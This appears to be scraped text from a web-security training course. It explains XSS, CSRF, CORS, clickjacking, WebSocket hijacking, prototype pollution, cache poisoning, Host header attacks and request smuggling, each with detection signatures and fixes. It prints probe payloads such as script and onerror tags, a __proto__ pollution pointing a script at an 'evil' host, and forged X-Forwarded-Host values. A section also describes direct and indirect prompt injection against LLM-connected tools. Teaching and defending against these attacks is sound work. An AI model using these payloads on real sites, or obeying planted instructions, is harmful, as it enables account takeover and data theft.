    XSS runs the attacker’s JavaScript in the victim’s browser, in the victim’s session — so it can do anything the user can: steal session cookies and tokens, act as them, capture keystrokes and credentials, or rewrite the page. Reflected fires from a crafted link, stored persists and hits every viewer, DOM-based never touches the server. Land one on an admin and it is often full application compromise.
    


    Three types
    
      
      
        
    • Reflected — payload is in the request (a crafted link); it runs when the victim opens that link. One victim per click (the lab below).
      • 
        
    • Stored — payload is saved server-side (a comment, a profile field) and runs for everyone who views it. The most dangerous — no lure needed.
      • 
        
    • DOM-based — the page’s own JavaScript takes attacker input and writes it to a dangerous sink, entirely in the browser — the server may never see it.
      • 
      
    

      
    Why it happens — context is everything
    
      
    The bug is always the same: input reaches the page without being encoded for the context it lands in. But the exploit changes with the context, because each context ends differently — so the break-out differs (the three panels below): in the HTML body you inject a tag; in an attribute you first close it with ">; inside a script you close the string with "; and comment out the rest. Finding XSS is really finding where your input is reflected and how to escape that spot.
    

      
    What an attacker does with it
    
      
    Steal the session cookie, impersonate the user, perform actions as them (bypassing CSRF tokens, since the script reads them), capture keystrokes and credentials on a fake login, deface or phish through the trusted page, or pivot with a framework like BeEF.
    

      
    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s injectable
    
        
    A unique marker, then a harmless tag: <b>zzq</b>It renders bold (parsed as HTML), not as text — output isn’t encoded.
    
        
    "><script>alert(1)</script> in each parameter and stored fieldThe alert fires — the value reached a script-executing context. (Use print() on recent Chrome.)
    
        
    Check the context: HTML body, an attribute, inside <script>, or a URLEach needs a different break-out (", ’, >) — the reflection point decides the payload.
    
        
    When tags are filtered: an event handler <img src=x onerror=alert(1)> or <svg onload=…>It executes without a <script> tag — the filter was a blacklist.
    
      
    
      
    Where do you do this?
    Send a unique marker to every input — URL params, form fields, headers, stored fields — and find where it reflects. In the browser’s Elements panel, read the exact context around your marker, then pick the matching break-out. Burp’s scanner finds most reflected/stored XSS automatically.
    

      
    What changes, and why it works
    The attacker sends input containing markup instead of a plain value. It works because the app puts that input into an HTML response (reflected or stored) without encoding it for the context it lands in — so the browser treats attacker data as page code.
    

      
    The one line (SOC)
    Script-like payloads (<script>, onerror=, javascript:) in parameters or stored fields, and CSP report-uri violations, are the signature — along with unusual outbound requests carrying cookies to an unknown domain (the exfiltration step).
    

      
    How do I stop it?
    
      
    Remember
    Encode on output, for the exact context. HTML-encode in HTML, attribute-encode in attributes, JS-encode in scripts, URL-encode in URLs — a modern framework’s auto-escaping does most of this. Add input validation, a strong Content-Security-Policy as a safety net, and HttpOnly cookies so a stolen-cookie payload comes up empty.

    DOM-Based Vulnerabilities
    
      
    Same result as reflected and stored XSS — script running in the victim’s browser — but the server never touches the payload. The page’s own JavaScript takes attacker input and feeds it to a dangerous function.
    
    
    
    
    

      
    So what is a DOM-based vulnerability?
    
      
    Client-side JavaScript reads data from a source the attacker can influence and passes it to a sink — a function or property that treats strings as HTML, code, or navigation. When it’s a sink like innerHTML or eval, attacker data becomes attacker code, all in the browser. CWE-79 (client-side).
    

            
    What can an attacker achieve?
    
      
    Same payoff as XSS — script in the victim’s session — but the bug lives entirely in client-side JavaScript: a source you control (location.hash, location.search) flows into a dangerous sink (innerHTML, document.write, eval) with no encoding. Because it never reaches the server, server-side filters and WAFs never see it.
    


    Why it happens
    
      
    Modern apps do more and more in the browser, so untrusted values (the URL, a message, stored data) get read and written by page scripts without ever round-tripping to the server. The developer trusts a source and hands it to a sink that interprets it — and because the bug is in shipped JavaScript, no server-side encoding, WAF, or log is in the path to catch it.
    

      
    Sources & sinks
    
      
      
        
    • Sources (attacker-influenced input) — location.hash, location.search, document.referrer, document.cookie, window.name, postMessage, localStorage.

    • Sinks (dangerous operations) — innerHTML/outerHTML, document.write, eval/Function, setTimeout("…"), location =/.href, element.src, jQuery .html().

    CSRF — Cross-Site Request Forgery
    
      
    The victim never clicks “yes.” The victim’s browser does — automatically, faithfully attaching the exact cookie that proves who they are, to a request the attacker wrote.
    
    
    
    
    

      
    So what is CSRF?
    
      
    CSRF tricks a logged-in victim’s browser into sending a state-changing request the victim never intended. The attacker doesn’t read or steal anything — they rely on the browser’s habit of auto-attaching cookies to any request bound for a site, whoever built the request. OWASP A01, CWE-352.
    

            
    What can an attacker achieve?
    
      
    CSRF makes the victim’s browser send a state-changing request they never intended — change their email or password, transfer funds, add an admin — riding on cookies the browser attaches automatically. The attacker can’t read the response, but they don’t need to: the action is the goal. Chain ‘change email → reset password’ and CSRF becomes account takeover.
    


    The three conditions it needs
    
      
      
        
    • A relevant action — something worth forging: change email/password, transfer funds, delete an account.
      • 
        
    • Cookie-based session handling — the request is authenticated only by a session cookie the browser sends automatically.
      • 
        
    • No unpredictable parameters — the attacker can supply every value; nothing like a CSRF token or the current password is required.
      • 
      
    
      
    Remove any one of these and CSRF fails — which is exactly how the defences above work.
    

      
    Why it happens
    
      
    The browser was designed to attach a site’s cookies to every request to that site, so you stay logged in as you click around. CSRF abuses that: a request to bank.com carries bank.com’s cookie even when the page that triggered it is evil.com. If the server treats “valid session cookie” as “the user meant to do this,” a forged request from any origin passes.
    

      
    How do I find it?
    
      
    
        
    What you check / sendWhat tells you it’s exploitable
    
        
    A state-changing request — does it carry a CSRF token at all?No token (only the session cookie) — forge it with a plain auto-submitting form.
    
        
    Remove / change the token and resend in BurpStill accepted — validation is missing, present-only, or not tied to the session.
    
        
    Change POST to GET, or reuse another account’s tokenAccepted — method-based or session-unbound token check (a bypass).
    
        
    Is the token mirrored in a non-session cookie?Double-submit flaw — set that cookie via <img> and match it in the form.
    
      
    
      
    Where do you do this?
    In Burp: isolate the state-changing request, then use Engagement tools → Generate CSRF PoC to build the auto-submitting HTML. Host it, open it while logged into the target, and confirm the action fired.
    

      
    The attack, step by step
    
      
      
        
    1. Pick the action. Find a sensitive request with no token — e.g. POST /account/email (the first PortSwigger lab).
      2. 
        
    2. Build the page. An HTML form targeting that URL with the attacker’s values, auto-submitted by document.forms[0].submit() — no click needed.
      3. 
        
    3. Deliver it. The logged-in victim opens your page; the browser attaches their cookie and the action runs. Chain it — change email, then trigger a password reset — for full account takeover.
      4. 
      
    

      
    What changes, and why it works
    The attacker hosts a page with an auto-submitting form (or a simple <img>/fetch for a GET-based action) targeting the victim site. It works because the browser auto-attaches cookies to cross-origin requests, and the endpoint has no unguessable per-request token to check — only “is there a valid session,” which the forged request satisfies.
    

      
    The one line (SOC)
    A sensitive state-changing request arriving with a Referer/Origin header pointing at an unrelated third-party domain — or missing a CSRF token the app normally requires — is the signature.
    

      
    How do I stop it?
    
      
    Remember
    Per-request CSRF tokens plus SameSite=Lax/Strict cookies — two independent layers. The token must be tied to the session and validated on every state-changing request; SameSite stops the cookie riding along on cross-site requests. Relying on SameSite alone breaks the moment a subdomain or a GET-based state change is overlooked — which is why both matter. Modern browsers default new cookies to SameSite=Lax, so CSRF is rarer than it was, but far from gone.

    CORS & the Same-Origin Policy
    
      
    The Same-Origin Policy stops one site reading another’s responses. CORS is how a server safely relaxes that — and getting the opt-in wrong lets the attacker’s site read your private data with your own session.
    
    
    
    
    

      
    SOP first — the rule CORS relaxes
    
      
    An origin is scheme + host + port (https://bank.com:443). The Same-Origin Policy lets a page send a request to another origin but not read the response — so a random site can’t read your bank’s pages using your session. This is the quiet assumption every other page in this section leans on.
    

      
    So what is CORS — and the bug?
    
      
    CORS is a controlled way to relax SOP: the server opts specific origins in with Access-Control-Allow-Origin (ACAO), and allows credentials with Access-Control-Allow-Credentials: true (ACAC). The bug is getting that opt-in wrong — most often reflecting whatever Origin was sent — so every origin, including the attacker’s, is trusted. CWE-942. Note the contrast with CSRF: there you could send a state-changing request; a CORS misconfig lets you read the response.
    

            
    What can an attacker achieve?
    
      
    CORS doesn’t grant new access — a misconfigured CORS policy hands the attacker’s page the ability to read a victim’s authenticated responses cross-origin, which the Same-Origin Policy was meant to prevent. Reflecting the Origin with Access-Control-Allow-Credentials: true (or trusting null / sloppy subdomain matches) lets evil.com fetch the user’s private data or API keys and exfiltrate them.
    


    The misconfigurations worth probing
    
      
      
        
    • Reflected origin + credentials — ACAO echoes the request’s Origin and ACAC is true (the second chip below, the first lab).
      • 
        
    • Whitelisted null — a sandboxed <iframe> sends Origin: null; servers that trust null are exploitable.
      • 
        
    • Weak whitelist matching — endsWith('bank.com') passes evilbank.com; a prefix check passes bank.com.evil.com.
      • 
        
    • Trusted subdomain with XSS — any trusted *.bank.com that has XSS can issue the credentialed read for you.
      •

    Clickjacking
    
      
    No injected code, no stolen token, no forged request the app didn’t already trust. Just a real click, aimed somewhere the victim never saw.
    
    
    
    
    

      
    So what is clickjacking?
    
      
    Clickjacking (UI redressing) tricks a victim into clicking something different from what they see. The attacker loads the target site in a near-invisible <iframe> (opacity: 0.0001) and positions it so a sensitive button lands exactly under a decoy button on their own page. The victim clicks the decoy; the click really hits the hidden real button — in their own logged-in session. CWE-1021.
    

            
    What can an attacker achieve?
    
      
    Clickjacking steals the victim’s click. The attacker frames the real site invisibly over a decoy; the user thinks they’re clicking ‘Play’ but actually clicks ‘Delete account’, ‘Confirm transfer’, or an OAuth ‘Allow’ on the genuine, logged-in app — turning a legitimate authenticated action into one they never meant to take.
    


    Why it happens
    
      
    By default any page may be loaded inside an iframe — that is how embeds, previews and widgets work. Clickjacking is possible when a sensitive page carries no framing restriction (X-Frame-Options or CSP frame-ancestors), so the attacker is free to frame it and layer a decoy on top. Crucially, a CSRF token does not help: the request is genuine, same-origin, made by the real page from the victim’s real session.
    

      
    Attack variants
    
      
      
        
    • Single sensitive action — overlay the real “Delete account” / “Transfer” / “Grant access” button (below).
      • 
        
    • Pre-filled form — URL params populate the fields first (?amount=1000&to=attacker), then clickjack the submit.
      • 
        
    • Clickjacking + DOM XSS — frame a URL that carries an XSS payload so the click both acts and runs script.
      • 
        
    • Multistep — chained overlays walk the victim through a multi-click workflow (add to cart → confirm).
      • 
      
    

      
    How do I find it?
    
      
    
        
    What you checkWhat tells you it’s exploitable
    
        
    Load the sensitive page inside your own <iframe> — does it render?It appears framed — no framing restriction is set.
    
        
    Read the response headersNo X-Frame-Options and no CSP frame-ancestors — framing is allowed.
    
        
    Build an overlay with Burp Clickbandit and try the click-throughThe decoy click triggers the real action — confirmed clickjacking.
    
      
    
      
    Where do you do this?
    In an HTML page you host (or Burp → Clickbandit, which records an overlay for you). Test while logged into the target in the same browser — the frame uses that session.
    

      
    What changes, and why it works
    The attacker overlays the real target page inside a near-invisible iframe, precisely positioned so its sensitive button sits exactly under a decoy button the victim intends to click. It works because the target page can be framed — nothing in its response headers refuses that.
    

      
    The one line (SOC)
    Hard to see server-side by design — the request itself is completely legitimate. This is a case where the fix (response headers) matters more than detection; if you must detect it, look for a sensitive action performed via a session with no matching first-party navigation history, or a spike of referrers from an unexpected framing origin.
    

      
    How do I stop it?
    
      
    Remember
    Content-Security-Policy: frame-ancestors ’none’ (or a specific allow-list) — the modern fix, with X-Frame-Options: DENY/SAMEORIGIN for older browsers. These tell the browser not to render the page in a frame, so it can’t be layered under a decoy. Add SameSite cookies for depth. A CSRF token does nothing here; frame-busting JavaScript alone is bypassable with the iframe sandbox attribute.

    WebSocket Vulnerabilities
    
      
    One connection that stays open and talks both ways. Every frame is still untrusted input — and the handshake has CSRF’s weakness, so an attacker can tap the whole live stream as the victim.
    
    
    
    
    

      
    So what is a WebSocket — and what breaks?
    
      
    A WebSocket is opened by an HTTP handshake (GET + Upgrade: websocket) and then upgrades to a persistent, full-duplex channel — one connection, messages flowing both ways at any time. Great for chat, trading, live feeds. Three things break: the messages (still untrusted input), the handshake (trust decisions on HTTP headers), and who may open one (CSWSH). CWE-345/1385.
    

            
    What can an attacker achieve?
    
      
    Two payoffs. Message manipulation — every frame is untrusted input, so the server-side bugs from earlier (XSS, SQLi) ride over the socket. Cross-site WebSocket hijacking (CSWSH) — the handshake has CSRF’s weakness, so an attacker page opens a socket with the victim’s cookies and reads and sends on the live two-way channel as them.
    


    The three attack classes
    
      
      
        
    • Manipulating messages — a frame is just data you control; rewrite the JSON and you get the server-side bugs from earlier through a new channel: XSS (the second chip, the first lab), SQLi, XXE, depending on how the message is handled.
      • 
        
    • Manipulating the handshake — the upgrade request is HTTP; misplaced trust in headers like X-Forwarded-For, or weak session handling, can be abused.
      • 
        
    • Cross-Site WebSocket Hijacking (CSWSH) — the handshake has no CSRF token and the server doesn’t check Origin, so an attacker page opens a socket with the victim’s cookies and reads the whole two-way stream (the third chip).
      • 
      
    

      
    Why CSWSH is CSRF’s dangerous cousin
    
      
    The handshake is an ordinary cross-origin request, so the browser attaches the victim’s cookies automatically — exactly like CSRF. But where CSRF sends one forged request you can’t read the reply to, CSWSH opens a standing, two-way channel: the attacker reads the victim’s live data (like a CORS leak) and can send messages as them. It combines CSRF’s cookie ride-along with CORS-style reading.
    

      
    How do I find it?
    
      
    
        
    What you check / sendWhat tells you it’s exploitable
    
        
    Intercept frames in Burp → WebSockets history and edit the JSONThe edited message reaches the server/other clients — message manipulation is possible.
    
        
    Replay the handshake with Origin: https://evil.comIt still returns 101 Switching Protocols — Origin isn’t validated (CSWSH).
    
        
    Check the handshake for a CSRF tokenNone present — the connection is authenticated by cookie alone.
    
      
    
      
    Where do you do this?
    In Burp: the WebSockets history tab shows every frame; intercept and edit them like HTTP requests. For CSWSH, host a page that runs new WebSocket(target) with an onmessage that exfiltrates — it only works if the handshake accepted your origin with the victim’s cookies.
    

      
    What changes, and why it works
    For CSWSH, the attacker’s page opens a WebSocket handshake to the target — an ordinary HTTP request the browser attaches the victim’s cookies to automatically, exactly like CSRF. It works because the handshake relies on the session cookie alone, with the Origin header never validated, so a handshake initiated from any origin succeeds and upgrades to a live channel.
    

      
    The one line (SOC)
    A WebSocket handshake (Upgrade: websocket) whose Origin header doesn’t match any expected first-party domain, that still receives a 101 Switching Protocols response, is the tell — as is a frame carrying script-like or query-like content.
    

      
    How do I stop it?
    
      
    Remember
    Validate Origin during the handshake and add a CSRF token to it — don’t rely on the cookie alone as proof of a legitimate origin. Use wss:// for transport security, and once the channel is open, treat every message as untrusted input in both directions — the injection and output-encoding rules from Sections 1–4 all still apply to what rides over the socket.
    

      
    Now see it happen
    Watch a live chat run over one persistent pipe. Then tamper an outgoing frame into an XSS payload — and finally watch evil.com open its own socket with the victim’s cookies and mirror every private message.

    Prototype Pollution
    
      
    Every object in JavaScript shares one hidden ancestor. Pollute it, and you’ve quietly rewritten a default for every object in the app — including ones that don’t exist yet.
    
    
    
    
    

      
    So what is prototype pollution?
    
      
    In JavaScript every object inherits from Object.prototype — the shared root of the prototype chain. When code reads a property, the engine checks the object, then walks up the chain to that root. Prototype pollution is writing an attacker-controlled property onto that shared root, so every object in the app suddenly inherits it. CWE-1321. Opening Section 5: parser- and language-level bugs that don’t fit “server trusted input as code” or “browser trusted an origin.”
    

            
    What can an attacker achieve?
    
      
    By writing to Object.prototype, an attacker changes a default inherited by every object in the app at once — including ones that don’t exist yet. Rarely dangerous alone, it’s almost always chained through a gadget to a real sink: DOM XSS on the client, or (on Node) remote code execution and privilege escalation.
    


    Why it happens — the three ingredients
    
      
    It takes three things lined up (the cards below):
    
      
      
        
    • A source — attacker-controllable input with a crafted key: ?__proto__[x]=y, or JSON {"__proto__":{"x":"y"}}, or a web message.
      • 
        
    • A sink — code that copies that input into an object without checking keys: a recursive merge, deep-clone, or query-string parser. __proto__ is treated as a live reference to the prototype, so the write lands on Object.prototype.
      • 
        
    • A gadget — app code that later reads a property it never set (a config default, an innerHTML, a script src) — now supplied by the polluted prototype, leading to DOM XSS or (on Node) RCE.
      • 
      
    

      
    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s there
    
        
    Inject a marker on the prototype: ?__proto__[zzq]=pollutedIn the console, ({}).zzq returns "polluted" — a brand-new, unrelated object inherits it.
    
        
    Try both key forms: __proto__[x] and constructor[prototype][x]Either pollutes — some sinks block one spelling but not the other.
    
        
    Let Burp DOM Invader scan the pageIt enumerates sources, finds the sink, and auto-identifies a gadget to a sink like innerHTML.
    
      
    
      
    Where do you do this?
    Client-side: the URL/query/hash and the browser console (and DOM Invader). Server-side: any JSON endpoint that merges input — send {"__proto__":{"…":"…"}} and look for a behaviour change or a reachable Node gadget.
    

      
    The attack, step by step
    
      
      
        
    1. Pollute. Send a source that reaches a merge sink: ?__proto__[transport_url]=//evil — now it’s on Object.prototype.
      2. 
        
    2. Confirm global reach. A fresh object inherits it: ({}).transport_url is set, though you never touched that object.
      3. 
        
    3. Reach a gadget. Point the polluted property at a dangerous sink — script.src/innerHTML for DOM XSS (the first lab), or a Node config used in child_process/a template for RCE.
      4. 
      
    

      
    What changes, and why it works
    The attacker submits a key path containing __proto__ to any endpoint that recursively merges user input into an object. It works because the merge doesn’t block the __proto__ key — that key is a live reference to the object’s prototype, so writing into it during a merge pollutes the shared Object.prototype every object inherits from.
    

      
    The one line (SOC)
    A request body or query string containing __proto__, constructor.prototype, or prototype as a key is essentially never legitimate user input — flag it outright.
    

      
    How do I stop it?
    
      
    Remember
    Block __proto__/constructor/prototype keys in any recursive merge, or avoid plain objects for user-controlled data (Object.create(null), a Map), and Object.freeze(Object.prototype) as defence-in-depth. Validate against a schema. Rarely exploitable alone — it is almost always chained into DOM XSS (client) or RCE (server) through a gadget, so closing the sink also closes the chain.

    Web LLM Attacks
    
      
    An LLM can't tell “instructions my developer wrote” from “text a stranger planted” — both are just tokens in the same window. Give it tools to call, and that confusion reaches your backend.
    
    
    
    
    

      
    So what are web LLM attacks?
    
      
    Apps increasingly wire an LLM to tools and APIs it can call on the user’s behalf — look up an order, query a DB, send mail, manage an account. Attacking that integration is, as PortSwigger puts it, a lot like SSRF: you can’t reach the internal APIs directly, but the LLM can, and you can talk it into using them. The root problem is the same shape as SQLi/SSTI — no boundary between instructions and data — on a new kind of interpreter.
    

            
    What can an attacker achieve?
    
      
    Attacking an LLM integration is, PortSwigger notes, a lot like SSRF: you can’t call the internal tools, but the LLM can — and you can talk it into it. So the payoff is whatever the model’s tools allow: delete or modify accounts, run queries, send mail, leak data from other users’ context. With no boundary between instructions and data, a prompt (direct) or poisoned content (indirect) reaches the backend with the model’s own privileges.
    


    The three attack classes
    
      
      
        
    • Prompt injection — direct (you type the malicious instruction) or indirect (you plant it in data the LLM ingests: a review, email, web page, doc). The model treats both as authoritative (the direct / indirect chips below).
      • 
        
    • Exploiting LLM APIs / excessive agency — the model calls a dangerous tool with your arguments; whatever it passes is your input reaching the backend, so you relay SQLi, SSRF, or RCE through the tools (the first lab).
      • 
        
    • Insecure output handling — the app treats the LLM’s output as trusted and renders it, so a prompt that makes the model emit a <script> becomes XSS.
      • 
      
    

      
    Why it happens
    
      
    The LLM’s system prompt (developer rules), the user’s message, and any data it reads all land in one context window as plain text. There is no cryptographic marker saying “this part is trusted.” So “rules” like don’t reveal your prompt or don’t call that API are suggestions a jailbreak overrides — not access control.

    Web Cache Poisoning
    
      
    One request from the attacker. Every visitor after them gets the same poisoned page — the cache did the distribution work for free.
    
    
    
    
    

      
    So what is web cache poisoning?
    
      
    A cache stores one response per cache key — usually path + query + Host — and replays it for every matching request. Parts of the request it ignores when matching are unkeyed inputs. Web cache poisoning is finding an unkeyed input that still influences the response, sending a malicious value in it, and getting that poisoned response stored under the normal key — so it is served to everyone. CWE-444/525.
    

      
    Poisoning vs deception
    Poisoning (here) — inject malicious content into a cached response served to everyone. Deception — trick the cache into storing a victim’s private response so the attacker can read it. Same component, opposite direction.
    

            
    What can an attacker achieve?
    
      
    One crafted request poisons a cached response that is then served to every visitor of that page — so a single injection becomes mass XSS, a forced redirect to attacker JS, or a site-wide defacement, for the whole cache lifetime. It out-scales almost any single-victim bug: the cache does the distribution for free.
    


    Why it happens — the key/unkeyed mismatch
    
      
    The cache and the origin disagree about what makes two requests “the same.” The cache says “same path and Host → same response, reuse it.” The origin says “ah, but I render differently based on this header.” When a header that changes the response is not in the cache key, the attacker’s version gets cached and handed to users who never sent that header. That is exactly why tampering a keyed input (the Host chip below) fails: it files the poison under a key nobody else requests — you must change the response without changing the key.
    

      
    The three-step method
    
      
      
        
    1. Find an unkeyed input. Use Burp Param Miner → Guess headers to spot headers that change the response but aren’t in the cache key (the classic is X-Forwarded-Host).
      2. 
        
    2. Elicit a harmful response. Make that input produce something dangerous — e.g. it’s reflected into an imported <script src>, so X-Forwarded-Host: evil.com yields src="//evil.com/…" (the first lab).
      3. 
        
    3. Get it cached. Send it (without a cache-buster) so the poisoned response is stored under the real key — then every visitor to that page is served it for the whole cache lifetime.
      4. 
      
    
      
    Where do you do this?
    In Burp: use a cache-buster query param while probing so you don’t poison the live cache, confirm the reflection and X-Cache: miss/hit / Age, then drop the buster to land the poison. Param Miner automates unkeyed-header discovery.
    

      
    What changes, and why it works
    The attacker finds a header or parameter the origin uses to render the response but the cache ignores when deciding what counts as “the same request” — an unkeyed input — then sends one crafted request containing a malicious value in it. The cache does the rest: it stores and redistributes the poison.
    

      
    The one line (SOC)
    A cached response containing unexpected third-party resource URLs, or a sudden shift in a popular page’s content with no corresponding deploy, is the tell; Burp’s Param Miner is the standard tool for proactively finding unkeyed-but-influential headers.
    

      
    How do I stop it?
    
      
    Remember
    Every input that can influence the response must be part of the cache key — or stripped before the origin ever sees it. Don’t cache responses that vary on unkeyed input, cache only truly static content, disable headers the site doesn’t need (X-Forwarded-Host and friends), and never reflect a header into the page. One poisoned entry on a high-traffic page out-scales almost any single-request bug in this course.
    

      
    Now see it happen
    Watch what the cache keys on — and what it ignores. Tamper the keyed Host and only you are hit; tamper an unkeyed header the origin still trusts (X-Forwarded-Host) and one request poisons the page for every visitor.

    HTTP Host Header Attacks
    
      
    You control the Host header on every request you send. When an app trusts it to decide which site to build links to, you get to choose that site — and bake it into an email the victim will click.
    
    
    
    
    

      
    So what is a Host header attack?
    
      
    Every HTTP request carries a Host header — it’s how one IP serving many sites (virtual hosting) knows which one you meant. The problem: it is a plain request header, so the client fully controls its value. A Host header attack is supplying a Host (or an override like X-Forwarded-Host) that the server trusts and reuses — to build a link, pick a cache entry, route a request, or fire a server-side callback — without ever checking it against the domains it actually owns.
    

            
    What can an attacker achieve?
    
      
    When the app trusts the Host header, an attacker who controls it can poison password-reset links (the reset email points at the attacker’s domain → account takeover), poison the cache, reach routing-based SSRF, or bypass host-based access checks — all from a header the client fully controls.
    


    Why it happens — developers treat Host as trusted
    
      
    Hardcoding a domain in code is annoying, so frameworks expose the incoming Host as a convenient “current domain” variable — _SERVER['HTTP_HOST'], request.host, X-Forwarded-Host behind a proxy. It feels like the server’s own identity, but it is attacker input wearing the server’s name. The absolute URL in a password-reset email is the classic sink: the app does "https://" + host + "/reset?token=" + t, and whoever sent the request chose host.
    

      
    The five ways it’s abused
    
      
    
        
    ExploitWhat the Host value becomes
    
        
          
    Password-reset poisoningThe domain in the reset link. Victim gets a real email with a real token — pointing at your server. (the first lab)
    
          
    Web cache poisoningAn unkeyed input reflected into the page — served to every later visitor.
    
          
    Routing-based SSRFA reverse proxy routes by Host; a forged value points the backend fetch at internal infrastructure.
    
          
    Access-control bypassAn admin or intranet vhost gated only on Host — forge it and reach the restricted app.
    
          
    Authentication bypass / injectionHost reflected into a trusted field, or used to skip a check that assumes an internal origin.
    
            
      
    

      
    How do I find it?
    
      
      
        
    1. Send an arbitrary Host. In Burp Repeater, change Host to a value you control and see if you still get a normal 200 — if the app answers happily for any host, it isn’t validating.
      2. 
        
    2. Try the override headers. If Host is checked, add X-Forwarded-Host: evil.com (or X-Host, Forwarded). Many apps validate Host but still build URLs from the override — exactly the third tab above.
      3. 
        
    3. Check where it lands. Trigger a flow that emits an absolute URL (password reset, invite, canonical link) and look for your injected domain in the output — or probe duplicate Host headers and absolute request lines (GET https://real/ HTTP/1.1) against flawed parsing.
      4. 
      
    
      
    Where do you do this?
    All of it in Burp Repeater — the Host line is right there at the top of every request, so you just edit it and resend. For the password-reset lab you also need an exploit server / collaborator to catch the token when the victim’s link resolves to your domain.
    

      
    What changes, and why it works
    You send an ordinary request with a forged Host (or X-Forwarded-Host). It works because the app implicitly trusts that header and never checks it against an allow-list of domains it owns before using it to build security-sensitive output — so your domain ends up in a link the victim trusts because the email genuinely came from the real service.
    

      
    The one line (SOC)
    A Host or X-Forwarded-Host that doesn’t match the app’s own known domains — especially hitting /forgot-password, invite, or callback endpoints — is the tell; it should be rejected at the edge, never reflected into a response or an email.
    

      
    How do I stop it?
    
      
    Remember
    Never build security-sensitive URLs from the Host header — use a hardcoded, server-side domain. Validate Host against an allow-list of your own domains at the edge (and reject anything else), disable override headers like X-Forwarded-Host unless you genuinely need them, and keep internal/admin vhosts on segregated infrastructure rather than gating them on a header the client controls.

    HTTP Request Smuggling
    
      
    Two servers read the exact same bytes. One trusts Content-Length; the other trusts Transfer-Encoding. That one disagreement is enough to hijack the next person’s request.
    
    
    
    
    

      
    So what is request smuggling?
    
      
    Most stacks put a front-end (proxy, load balancer, CDN) in front of a back-end app server, and reuse one back-end connection for many users’ requests (keep-alive). Both components re-parse the same raw bytes. HTTP request smuggling sends a request deliberately ambiguous about where it ends, so the two disagree: the bytes one considers “still this request” the other treats as “the start of the next one.” That orphaned prefix glues onto the next victim’s request.
    

            
    What can an attacker achieve?
    
      
    When the front-end and back-end disagree on where one request ends, an attacker smuggles a second request into the start of someone else’s — to bypass front-end security controls, poison responses served to other users, capture other users’ requests and credentials, and chain to further exploits. It’s a powerful pivot because it corrupts the shared request stream itself.
    


    Why it happens — CL vs TE ambiguity
    
      
    HTTP/1.1 has two ways to state body length: Content-Length (byte count) and Transfer-Encoding: chunked (chunks ending in a 0 chunk). The spec says if both are present, use Transfer-Encoding — but historically servers disagreed, and an attacker who makes the two headers contradict each other gets a predictable desync.
    
      
    
        
    VariantWho trusts what
    
        
          
    CL.TEFront-end uses Content-Length; back-end uses Transfer-Encoding — leftover after the 0 chunk is smuggled (tab 1).
    
          
    TE.CLFront-end uses Transfer-Encoding; back-end uses Content-Length — roles flip, same result (tab 2).
    
          
    TE.TEBoth support TE, but one is tricked into ignoring it by an obfuscated header (Transfer-Encoding: xchunked, duplicate, spacing).
    
            
      
    

      
    How do I find & exploit it?
    
      
      
        
    1. Detect by timing. Send a request whose body the back-end will wait for — a desync makes the connection hang for a few seconds. Burp’s HTTP Request Smuggler automates this safely.
      2. 
        
    2. Confirm the desync. Smuggle a prefix and send a second normal request; if its response is poisoned or the method breaks (e.g. GPOST), the boundary disagreement is real.
      3. 
        
    3. Weaponise. Prepend to the next request to bypass front-end controls, capture another user’s request, or poison responses.
      4. 
      
    
      
    Where do you do this?
    Burp Repeater (disable the automatic Content-Length update, and use “Send group in sequence / single connection” to replay the victim request), plus the HTTP Request Smuggler extension for detection and the exploit scaffolding.
    

      
    What changes, and why it works
    The attacker sends one request carrying both Content-Length and Transfer-Encoding, made deliberately ambiguous. It works because the front-end and back-end disagree where the request ends — each trusts a different header, so bytes the front-end still considers “this request” the back-end treats as the start of a new one.
    

      
    The one line (SOC)
    Nearly invisible from a single request’s logs — the signature is unexplained response/request mismatches between users, or a front-end/proxy log disagreeing with the back-end’s access log for the same connection. Detection leans on infrastructure-level correlation, not payload inspection.
    

      
    How do I stop it?
    
      
    Remember
    HTTP/2 end-to-end removes the whole ambiguity class (it doesn’t use these text framing headers at all). Short of that, the front-end must normalise or outright reject any request with conflicting or obfuscated length headers rather than forwarding it, and avoid reusing back-end connections across users where possible.

Flip between the CL.TE and TE.CL variants.

    • Information disclosure — a stack trace, framework banner, or debug endpoint reaching a client outside dev.
      • 
        
    • Web cache deception — a cache HIT on an authenticated-looking prefix followed by a static-looking suffix.
      • 
      
    

      
    Section 4 — Client-side
    
      
      
        
    • XSS (reflected/stored) — HTML-special characters reflected unescaped in the response, or landing unescaped in rendered content later.
      • 
        
    • DOM-based XSS — little to no server evidence — lean on DOM Invader / CSP violation reports, not logs.
      • 
        
    • CSRF — a sensitive request with a Referer/Origin pointing at an unrelated domain, or a missing expected token.
      • 
        
    • CORS misconfig — an Access-Control-Allow-Origin that mirrors the request's Origin verbatim, paired with credentials allowed.
      • 
        
    • Clickjacking — hard to see server-side by design; the request is genuine, so the fix matters more than detection.
      • 
        
    • WebSocket hijacking — a handshake whose Origin doesn't match any first-party domain, still answered with 101.
      • 
      
    

      
    Section 5 — Advanced parser/protocol
    
      
      
        
    • Prototype pollution — a request containing __proto__, constructor.prototype, or prototype as a key.
      • 
        
    • Web LLM / prompt injection — an LLM-connected API call triggered by instruction-like phrasing, especially arriving inside summarized content.
      • 
        
    • Web cache poisoning — unexpected third-party resource URLs in a cached response, no corresponding deploy.
      • 
        
    • Host header attacks — a Host value that doesn't match the app's known domains, especially on reset/invite endpoints.
      • 
        
    • Request smuggling — unexplained response/request mismatches between users; front-end and back-end logs disagreeing.
      • 
      
    
    
    
  
    


  
  
    
    
    
      
    S08 · P60Recall⏱ 5 min
    
      
    Countermeasures — One Fix Per Flaw
    
      
    Almost every fix in this session reduces to one of five moves. Learn the five, and you can place the fix for any new bug you meet later.
    
    
    
    
    
      
    Where we are
    The mirror image of detection: instead of “how would you catch it,” this is “how would you have prevented it.”
    

      
      
        
    • Parameterize / separate code from data — SQLi, NoSQL, LDAP/ORM, command injection, XXE, SSTI. Never build a query, command, or document by string-concatenating user input; use prepared statements, parameterized APIs, or a data-only serialization format.
      • 
        
    • Encode on output, for the destination context — XSS (all three flavors), SSTI's escape hatch. HTML-encode for HTML body, attribute-encode for attributes, JS-string-encode inside <script>. A CSP is the second layer, never the only one.
      • 
        
    • Allow-list, never block-list — path traversal, file upload, CORS origins, Host header, cache-key inputs. Define what's acceptable and reject everything else, instead of trying to enumerate every dangerous pattern.
      • 
        
